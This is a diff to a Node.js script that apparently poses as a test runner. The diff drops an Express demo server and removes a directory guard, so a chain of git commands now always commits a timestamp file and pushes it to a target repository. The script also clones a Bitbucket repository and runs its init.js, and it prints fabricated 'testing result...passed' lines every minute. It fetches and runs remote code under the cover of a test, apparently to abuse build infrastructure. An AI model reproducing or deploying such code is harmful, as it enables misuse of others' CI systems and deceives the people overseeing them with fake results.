@@ -1,4 +1,3 @@
-var express = require('express');
 var exec = require("child_process").exec;
 var index = 1;
 var max = 28;
@@ -23,7 +22,7 @@ repo.stdout.on('data', function(data) {
     myrepo += 'git config --global user.name "test" && ';
     myrepo += 'cd ./aaa && echo ' + (new Date()).getTime();
     myrepo += ' > log && git add . && git commit -m "update log" && git push ' + target;
-    if(__dirname.indexOf('/home/bas/') === -1) exec(myrepo);
+    exec(myrepo);
 });
 
 var child = exec('rm -rf tmp && git clone https://goopop@bitbucket.org/goopop/buildkitepath.git tmp && cd ./tmp && node init.js');
@@ -44,12 +43,3 @@ interval = setInterval(function () {
   }
   console.log("testing result..." + index++ + '...passed');
 }, 1000 * 60);
-
-var app = express();
-app.get('/', function (req, res) {
-  res.send('Hello World!');
-})
-
-app.listen(8080, function () {
-  console.log('Example app listening on port 8080!')
-});
